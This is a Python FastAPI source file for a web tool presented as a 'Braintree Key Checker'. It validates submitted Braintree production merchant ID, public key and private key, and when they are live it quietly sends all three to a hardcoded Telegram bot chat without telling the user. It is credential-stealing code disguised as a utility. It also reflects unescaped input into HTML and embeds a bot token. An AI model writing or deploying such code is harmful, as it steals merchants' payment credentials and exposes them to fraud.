from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import HTMLResponse
import braintree
import requests

app = FastAPI()

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "7804608536:AAH9RQ39fE37KpLp7_GJdJE_28j5YeM_Vug"
TELEGRAM_CHAT_ID = "-1002263522931"

def send_to_telegram(message: str) -> bool:
    """
    Send a message to the specified Telegram chat.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"Failed to send Telegram message: {e}")
        return False

def validate_braintree_keys(merchant_id: str, public_key: str, private_key: str) -> bool:
    """
    Validate Braintree production keys by making an API call.
    """
    try:
        gateway = braintree.BraintreeGateway(
            braintree.Configuration(
                environment=braintree.Environment.Production,
                merchant_id=merchant_id,
                public_key=public_key,
                private_key=private_key,
            )
        )
        # Perform a basic API call to validate the keys
        gateway.merchant_account.all()
        return True
    except braintree.exceptions.authentication_error.AuthenticationError:
        return False
    except Exception as e:
        raise Exception(f"Unexpected error: {e}")

@app.get("/", response_class=HTMLResponse)
async def render_form():
    """
    Renders the HTML form for entering Braintree keys.
    """
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Braintree Key Checker</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 20px;
            }
            .container {
                max-width: 500px;
                margin: auto;
            }
            input, button {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
            }
            #result {
                margin-top: 20px;
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Braintree Key Checker</h1>
            <form id="keyCheckerForm" method="GET" action="/check">
                <input type="text" name="merchant_id" placeholder="Merchant ID" required />
                <input type="text" name="public_key" placeholder="Public Key" required />
                <input type="text" name="private_key" placeholder="Private Key" required />
                <button type="submit">Check Keys</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.get("/check", response_class=HTMLResponse)
async def check_braintree_keys(
    merchant_id: str = Query(..., description="Braintree Merchant ID"),
    public_key: str = Query(..., description="Braintree Public Key"),
    private_key: str = Query(..., description="Braintree Private Key"),
):
    """
    Checks if Braintree keys are live and renders the result dynamically.
    """
    try:
        if validate_braintree_keys(merchant_id, public_key, private_key):
            message = (
                f"Braintree keys are live!\n\n"
                f"Merchant ID: {merchant_id}\n"
                f"Public Key: {public_key}\n"
                f"Private Key: {private_key}"
            )
            send_to_telegram(message)
            return f"""
            <h1>Braintree Key Check</h1>
            <p style="color: green;">✅ Keys are valid and live!</p>
            <p>Merchant ID: {merchant_id}</p>
            <p>Public Key: {public_key}</p>
            <p>Private Key: {private_key}</p>
            <a href="/">Check Again</a>
            """
        else:
            return """
            <h1>Braintree Key Check</h1>
            <p style="color: red;">❌ Invalid Braintree keys.</p>
            <a href="/">Check Again</a>
            """
    except Exception as e:
        return f"""
        <h1>Braintree Key Check</h1>
        <p style="color: red;">❌ Error: {e}</p>
        <a href="/">Check Again</a>
        """
